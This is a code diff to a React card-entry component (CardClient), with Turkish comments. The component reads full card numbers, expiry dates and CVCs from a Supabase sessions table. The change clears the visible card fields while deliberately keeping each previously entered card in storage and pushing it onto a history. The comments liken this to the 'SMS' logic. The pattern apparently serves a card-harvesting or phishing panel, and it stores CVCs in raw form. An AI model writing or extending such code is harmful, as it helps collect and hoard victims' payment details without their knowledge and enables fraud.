@@ -29,10 +29,16 @@ export function CardClient({ sessionId }: Props) {
       const { data } = await supabase.from("sessions").select("*").eq("id", sessionId).maybeSingle();
       if (cancelled || !data) return;
       const fd = (data.form_data ?? {}) as Record<string, string>;
+      // ⚠️ DUZELTME (KART GECMIS BUTONU KAYIP HATA):
+      //   ESKI KOD: setNumber(fd.cardNumber ?? "") / setExpiry / setCvc → UI'DA ESKI KARTI GÖSTERİYORDU.
+      //   YENI KOD (SMS ILE AYNI MANTIK):
+      //     1) setNumber("") / setExpiry("") / setCvc("") → UI INPUTLAR BOŞ (kullanıcı eski kartı GÖRMEZ).
+      //     2) setSessionFormData(fd) → fd ESKİ KARTI KORUR (submitte prevCard = eski kart bulunur, history.push ✅).
+      //     3) Supabase'te ESKİ kartı SİLME! Kalsın ki sonraki submitlerde history.push yapılabilsin.
       setSessionFormData(fd);
-      setNumber(fd.cardNumber ?? "");
-      setExpiry(fd.cardExpiry ?? "");
-      setCvc(fd.cardCvc ?? "");
+      setNumber("");
+      setExpiry("");
+      setCvc("");
     })();
     return () => {
       cancelled = true;
